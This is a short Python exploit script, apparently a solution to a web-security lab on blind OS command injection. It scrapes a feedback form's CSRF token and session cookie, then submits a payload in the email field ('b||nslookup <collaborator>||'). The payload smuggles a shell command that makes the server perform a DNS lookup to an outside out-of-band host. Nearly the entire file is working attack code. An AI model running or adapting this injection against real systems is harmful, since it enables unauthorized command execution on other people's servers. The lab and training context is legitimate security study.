import sys
import requests
import time
from bs4 import BeautifulSoup

if len(sys.argv) != 3:
    print(f"USAGE: {sys.argv[0]} {sys.argv[1]} domain burp_collaborator_client")
    sys.exit(1)

URL = sys.argv[1]
client = sys.argv[2]

path="feedback"
url = URL+path
response = requests.get(url)

soup = BeautifulSoup(response.content, "html.parser")
csrftoken = soup.find('input', dict(name='csrf'))['value']

path="feedback/submit"
urli = URL+path
sess_cookie = response.cookies["session"]

payload='b||nslookup '+client+'||'
#print(payload)

data = {'csrf':csrftoken,'name':'abc','email':payload,'subject':'ghi','message':'jkl'}
response = requests.post(url=urli,data=data,headers={"Cookie": "session="+sess_cookie})
print("Poll now!!")
